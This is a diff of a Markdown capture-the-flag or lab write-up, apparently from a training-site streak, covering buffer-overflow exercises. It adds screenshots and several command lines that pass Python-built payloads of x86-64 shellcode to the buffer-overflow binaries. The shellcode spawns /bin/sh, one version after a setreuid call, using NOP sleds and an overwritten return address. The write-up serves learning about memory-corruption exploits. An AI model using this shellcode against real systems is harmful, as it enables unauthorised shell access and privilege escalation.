@@ -52,7 +52,21 @@ It´s part of my $$\textcolor{#FF69B4}{\textbf{213}}$$-day-streak in  <a href="h
 ![image](https://github.com/user-attachments/assets/83a118ec-4cdd-4f98-8ab4-91e1eeacf566)
 
 
-![image](https://github.com/user-attachments/assets/db831b0e-5515-4244-9267-08db4d0170e2)
+<p>continuing</p>
+
+<br>
+
+
+![image](https://github.com/user-attachments/assets/80afc8ec-0403-4c0c-abce-584c5a017392)
+
+<br>
+
+<pre><code>run $(python -c "print 'A'*100+'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + 'B'*6")</code></pre>
+
+![image](https://github.com/user-attachments/assets/71f00228-3590-48c6-8dd9-f0f7487c7c47)
+
+<br>
+
 
 
 
@@ -73,6 +87,7 @@ It´s part of my $$\textcolor{#FF69B4}{\textbf{213}}$$-day-streak in  <a href="h
 
 <pre><code>./buffer-overflow-2 $(python -c "print('\x90'*90 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*19 + '\x78\xe2\xff\xff\xff\x7f')")
 </code></pre>
+
 
 
 ./buffer-overflow $(python -c "print('A'*100 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + 'B'*6")")
